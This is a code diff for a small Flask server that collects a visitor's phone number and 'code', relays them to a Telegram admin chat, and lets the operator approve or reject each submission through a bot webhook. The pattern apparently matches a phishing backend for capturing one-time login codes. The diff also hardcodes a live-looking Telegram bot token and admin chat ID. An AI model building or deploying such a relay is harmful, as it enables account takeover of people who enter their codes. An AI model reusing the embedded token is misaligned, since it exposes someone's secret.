@@ -1,10 +1,27 @@
+from flask import Flask, request, jsonify, send_from_directory
+import requests
+import uuid
+import os
+
+# This was the missing part causing the crash!
+app = Flask(__name__, static_folder='.', static_url_path='')
+
+# YOUR CREDENTIALS
+TELEGRAM_TOKEN = "9120980562:AAHdCkCej7QrZp9nj6VrRT5zp13sZBQ69cI"
+ADMIN_CHAT_ID = "7477343871"
+
+pending_requests = {}
+
+@app.route('/')
+def index():
+    return send_from_directory('.', 'index.html')
+
 @app.route('/api/request-approval', methods=['POST'])
 def request_approval():
     data = request.json
     app_id = str(uuid.uuid4())
     pending_requests[app_id] = "pending"
     
-    # CHANGED: Now uses Phone and Code
     phone = data.get('phone', 'Unknown')
     code = data.get('code', 'Unknown')
     
@@ -26,3 +43,36 @@ def request_approval():
     })
     
     return jsonify({"app_id": app_id})
+
+@app.route('/api/check-status/<app_id>', methods=['GET'])
+def check_status(app_id):
+    status = pending_requests.get(app_id, "not_found")
+    return jsonify({"status": status})
+
+@app.route('/api/telegram-webhook', methods=['POST'])
+def telegram_webhook():
+    update = request.json
+    if "callback_query" in update:
+        callback = update["callback_query"]
+        data = callback["data"]
+        action, app_id = data.split("_")
+        
+        if app_id in pending_requests:
+            pending_requests[app_id] = action
+        
+        answer_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery"
+        requests.post(answer_url, json={"callback_query_id": callback["id"], "text": "Done!"})
+        
+        message_id = callback["message"]["message_id"]
+        edit_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
+        requests.post(edit_url, json={
+            "chat_id": ADMIN_CHAT_ID,
+            "message_id": message_id,
+            "text": f"Application {action}d.",
+            "reply_markup": {"inline_keyboard": []}
+        })
+    return "OK"
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
